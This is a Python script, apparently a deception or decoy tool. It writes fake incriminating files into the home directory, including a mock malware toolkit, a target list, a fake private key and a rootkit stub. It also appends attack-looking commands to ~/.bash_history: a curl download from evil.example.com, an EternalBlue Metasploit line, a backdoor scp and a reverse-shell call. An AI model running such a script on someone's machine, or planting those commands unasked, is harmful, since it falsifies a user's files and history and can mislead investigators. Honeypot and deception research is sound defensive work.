import os
import random
from pathlib import Path

FAKE_COMMANDS = [
    "nmap -sV 192.168.1.1/24",
    "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'",
    "curl -O http://evil.example.com/payload.sh",
    "scp backdoor.py root@192.168.1.10:/tmp/",
    "python3 reverse_shell.py 10.0.0.5 4444"
]

FAKE_FILES = {
    "Downloads/malware_toolkit_v5.zip": "This is a dummy malicious toolkit.",
    "Notes/targets.docx": "Targets: ACME Corp, Globex, Umbrella Inc.",
    ".ssh/id_rsa_old": "-----BEGIN FAKE PRIVATE KEY-----\nFAKEKEYDATA==\n-----END KEY-----",
    "Scripts/install_rootkit.sh": "#!/bin/bash\necho 'Fake rootkit installer'",
    ".vimrc": "set number\n\" Added by another operator"
}

def write_fake_file(relative_path, content):
    full_path = Path.home() / relative_path
    full_path.parent.mkdir(parents=True, exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    print(f"[+] Planted {full_path}")

def poison_history():
    hist_path = Path.home() / ".bash_history"
    with open(hist_path, "a") as f:
        for _ in range(10):
            cmd = random.choice(FAKE_COMMANDS)
            f.write(f"{cmd}\n")
    print(f"[+] Poisoned bash history with decoy commands")

def main():
    for path, content in FAKE_FILES.items():
        write_fake_file(path, content)
    poison_history()

if __name__ == "__main__":
    main()
